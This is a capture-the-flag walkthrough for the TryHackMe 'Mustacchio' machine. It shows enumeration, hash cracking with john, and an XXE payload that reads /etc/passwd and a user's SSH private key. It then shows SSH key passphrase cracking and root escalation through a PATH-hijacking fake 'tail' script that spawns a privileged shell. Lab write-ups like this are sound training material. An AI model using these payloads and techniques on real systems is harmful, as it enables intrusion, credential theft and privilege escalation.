# CTF-Write-up

## Try Hack Me: Mustacchio

##### URL: https://tryhackme.com/room/mustacchio

##### Created by _https://tryhackme.com/p/zyeinn_

![logo](https://user-images.githubusercontent.com/20625004/187385183-721c157c-5b71-4977-b5bc-d39375de5b57.PNG)

You should deploy the machine first.

Add the CTF ip to your host file.

``` echo "CTF ip" >> /etc/hosts```

Run nmap against the target machine.

```nmap -sC -A  <target IP>```

Ports 22 and 80.

Lets view port 80.

![80](https://user-images.githubusercontent.com/20625004/187385417-28e86e50-0cf3-4c4b-9c3a-842e34249e59.PNG)

With the use of ``ffuf`` tool we try to find intersing directories.

``fuf -u http://targgetIP/FUZZ -c -v -w /path/to/wordlist``

![custom](https://user-images.githubusercontent.com/20625004/187386233-5c381a8b-e78c-4770-98e5-28bcee8c3087.PNG)

Accessing the ``custom`` directory reveals another directory ``js`` beneath that, we’ find a ``users.bak`` file and download it.

![custom_js](https://user-images.githubusercontent.com/20625004/187386684-63eace75-a7f7-4ac9-9d33-4b8383209291.PNG)

![bak](https://user-images.githubusercontent.com/20625004/187388454-8ec4242d-fc82-40a4-a578-8436002b34cd.PNG)

with command ``file`` we found that the file is an SQLite database, and we can view the content with ``cat`` command.

We have a user called "admin" with a hash id. With ``hash-identifier`` tool we found that the hash is sha1.

![hash](https://user-images.githubusercontent.com/20625004/187388019-324effee-e859-44d4-bc46-e0c5f5b0c57a.PNG)

In order to find the password you can use online tools such as ``https://crackstation.net/`` or tools such as ``john``.

We will use ``john`` with the following command since we know the hash is of sha1.

``john --format=raw-sha1 sha.txt --wordlist=/path/to/wordlist/``

We finally found the password. Since ``SSH`` port is also open we try to access with username ``admin``.

``ssh admin@targetIP``

No success, after further enumaration we use again ``nmap`` now with all ports.

``nmap -sC -A  <target IP> -p- ``

We found a new port ``8765``.

Now we see a portal.

![admin_panel](https://user-images.githubusercontent.com/20625004/187389686-b8a0e787-68cd-4036-b699-58c3b7204989.PNG)

We use the ``admin`` username and the password that we found earlier and we access the web application.

![admin_panel_1](https://user-images.githubusercontent.com/20625004/187390006-ee1bd23f-f784-4543-b106-500cbe053e59.PNG)

It appears that we can add a comment to the website. Further by inspecting the source code of the page there is comment about another user and an ssh key.

![otheruser](https://user-images.githubusercontent.com/20625004/187390871-e02e78fd-4edb-4481-a9b7-f5e37edc0af5.PNG)

Back on the page we found we try to post something and error pops up that says: ``“Insert XML Code!”``.

Maybe the website is vulnerable to ``XML``, following the guideline ``https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing`` we try to inject with the comment area the below code.

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [<!ENTITY read SYSTEM "/etc/passwd"> ]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>&read;</com>
</comment>
```

![passwd](https://user-images.githubusercontent.com/20625004/187391967-214ddd6d-4440-4658-bafe-891f5bdd41ec.PNG)

Now we can read the contents of ``/etc/passwd`` and get a list of users on the system. We found two users and for the one user we have the comment from
the source code informing us about an ssh key.

We can use that information and further use a payload to read the contents of tha file for the given user.

We can modiy the payload we used earlier and include ``'file:///home/username/.ssh/id_rsa'`` by using the default location of ``id_rsa``.

![ssh_key](https://user-images.githubusercontent.com/20625004/187399534-60c4bc80-1c86-4781-9d97-181548da779f.PNG)

Now we found the users ssh key. Copy the whole key (lets call it id_rsa) to a file on your machine machine. The key is ENCRYPTED, and password protected. 
We need to use ``ssh2john`` tool and the crack it with ``john``. 

First we need to convert to a hash that ``john`` can use it to crack it.

``ssh2john id_rsa > hash ``  then ``john hash --wordlist=/path/to/wordlist/``.

![cracked](https://user-images.githubusercontent.com/20625004/187400508-a34b125c-9261-4ee1-8126-4068f9283197.PNG)

Change permission on the file id_rsa we created earlier ``chmod 700 id_rsa``.

With that password logg in via ``SSH``. 

``ssh -i id_rsa username@targetip``.

Sucess we enterd and on the users home directory you can find the first flag.

![user_flag](https://user-images.githubusercontent.com/20625004/187401613-e31f17b2-09f9-4011-958e-0f1a36bdf89e.PNG)

On second's user home directory there is a file ``/home/username/live_log``.

![live](https://user-images.githubusercontent.com/20625004/187402273-23df595e-d136-486c-abf0-c59a53da6fd5.PNG)

To further inspect the file we use commands ``file`` and ``strings``.

We observer that the binary executed the ``tail`` command to show the content of the ``/var/log/nginx/access.lo`` file. In order to exploit it, we
need to go ``/tmp`` folder, and create a ``tail`` file and  spawn a new bash instance, and add this one to the path and executed it again.

```#!/bin/bash

/bin/bash -p
```

Make the file we created executable ``chmod +x /tmp/tail``.

![flag_second](https://user-images.githubusercontent.com/20625004/187403642-b467b8ec-b41e-4173-8f70-91de7dace971.PNG)

On ``root`` directory you can find the second flag.

![root_flag](https://user-images.githubusercontent.com/20625004/187404542-b561a0d9-a122-4c9d-bb91-a6522cfa0b26.PNG)

